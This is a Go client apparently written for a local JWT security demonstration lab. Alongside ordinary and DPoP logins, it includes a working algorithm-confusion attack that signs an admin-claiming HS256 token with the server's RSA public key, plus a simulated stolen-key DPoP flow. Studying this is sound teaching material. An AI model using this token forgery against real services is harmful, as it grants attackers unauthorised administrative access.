package main

import (
	"crypto/rand"
	"crypto/rsa"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"time"

	"example/internal/models"

	"net/http/httputil"

	"github.com/golang-jwt/jwt/v5"
	"github.com/lestrrat-go/jwx/v2/jwk"
)

type TokenResponse struct {
	AccessToken string `json:"access_token"`
}

type LoggingRoundTripper struct {
	Proxied http.RoundTripper
}

func (l *LoggingRoundTripper) RoundTrip(req *http.Request) (*http.Response, error) {
	fmt.Printf("\n--- REQUEST ---\n")
	dump, _ := httputil.DumpRequestOut(req, true)
	fmt.Printf("%s\n", string(dump))

	startTime := time.Now()
	resp, err := l.Proxied.RoundTrip(req)
	duration := time.Since(startTime)

	if err != nil {
		fmt.Printf("\n--- ERROR ---\n%v\n", err)
		return nil, err
	}

	fmt.Printf("\n--- RESPONSE (%s) ---\n", duration.Round(time.Millisecond))
	respDump, _ := httputil.DumpResponse(resp, true)
	fmt.Printf("%s\n", string(respDump))
	fmt.Printf("-----------------\n")

	return resp, nil
}

func main() {
	authType := flag.String("auth-type", "standard", "Type of authentication (standard, vuln/alg-none, secure, dpop)")
	endpoint := flag.String("api-endpoint", models.PathDataClassic, "API endpoint to call")
	attack := flag.String("attack", "", "Specific attack to perform (alg-none, key-confusion)")
	flag.Parse()

	serverURL := "http://localhost:8080"
	var token string
	var clientKey *rsa.PrivateKey

	// Use logging client
	client := &http.Client{
		Transport: &LoggingRoundTripper{Proxied: http.DefaultTransport},
	}

	if *authType == "dpop" || *attack == "dpop-stolen" {
		clientKey, _ = rsa.GenerateKey(rand.Reader, 2048)
		fmt.Println("DPoP: Generated ephemeral client key pair")
	}

	if *attack == "dpop-stolen" {
		victimKey, _ := rsa.GenerateKey(rand.Reader, 2048)
		proof, _ := createDPoPProof(victimKey, "POST", serverURL+"/auth/dpop")

		req, _ := http.NewRequest("POST", serverURL+"/auth/dpop", nil)
		req.Header.Set("DPoP", proof)
		resp, _ := client.Do(req)

		var tokenResp TokenResponse
		json.NewDecoder(resp.Body).Decode(&tokenResp)
		token = tokenResp.AccessToken
		*endpoint = models.PathDataDPoP
		*authType = "dpop"
	} else if *attack == "key-confusion" {
		resp, _ := client.Get(serverURL + models.PathPublicKey)
		pubKeyBytes, _ := io.ReadAll(resp.Body)
		claims := models.CustomClaims{
			Name:  "Attacker (confusion)",
			Admin: true,
			RegisteredClaims: jwt.RegisteredClaims{
				Subject: "attacker_666",
				Issuer:  models.Issuer,
			},
		}
		t := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
		token, _ = t.SignedString(pubKeyBytes)
		*endpoint = models.PathDataVulnConfuse
	} else {
		req, _ := http.NewRequest("POST", fmt.Sprintf("%s/auth/%s", serverURL, *authType), nil)
		if *authType == "dpop" {
			proof, _ := createDPoPProof(clientKey, "POST", serverURL+models.PathAuthDPoP)
			req.Header.Set(models.HeaderDPoP, proof)
		}

		resp, err := client.Do(req)
		if err != nil {
			log.Fatalf("failed to login: %v", err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			log.Fatalf("login failed with status %d", resp.StatusCode)
		}

		var tokenResp TokenResponse
		json.NewDecoder(resp.Body).Decode(&tokenResp)
		token = tokenResp.AccessToken

		if *authType == "dpop" {
			*endpoint = models.PathDataDPoP
		}
	}

	req, _ := http.NewRequest("GET", fmt.Sprintf("%s%s", serverURL, *endpoint), nil)

	if *authType == "dpop" {
		req.Header.Set(models.HeaderAuthorization, fmt.Sprintf("%s %s", models.HeaderDPoP, token))
		proof, _ := createDPoPProof(clientKey, "GET", serverURL+*endpoint)
		req.Header.Set(models.HeaderDPoP, proof)
	} else {
		req.Header.Set(models.HeaderAuthorization, fmt.Sprintf("Bearer %s", token))
	}

	apiResp, err := client.Do(req)
	if err != nil {
		log.Fatalf("API request failed: %v", err)
	}
	defer apiResp.Body.Close()

	if apiResp.StatusCode == http.StatusOK {
		fmt.Println("\nSuccess! Concept demonstrated correctly.")
	} else {
		fmt.Println("\nAction failed. Check server logs.")
		os.Exit(1)
	}
}

func createDPoPProof(key *rsa.PrivateKey, method, url string) (string, error) {
	pubJWK, _ := jwk.FromRaw(key.Public())
	_ = pubJWK.Set(jwk.AlgorithmKey, "RS256")

	token := jwt.NewWithClaims(jwt.SigningMethodRS256, jwt.MapClaims{
		"htm": method,
		"htu": url,
		"iat": time.Now().Unix(),
		"jti": fmt.Sprintf("jti-%d", time.Now().UnixNano()),
	})
	token.Header["typ"] = models.TypeDPoPProof
	token.Header["jwk"] = pubJWK

	return token.SignedString(key)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
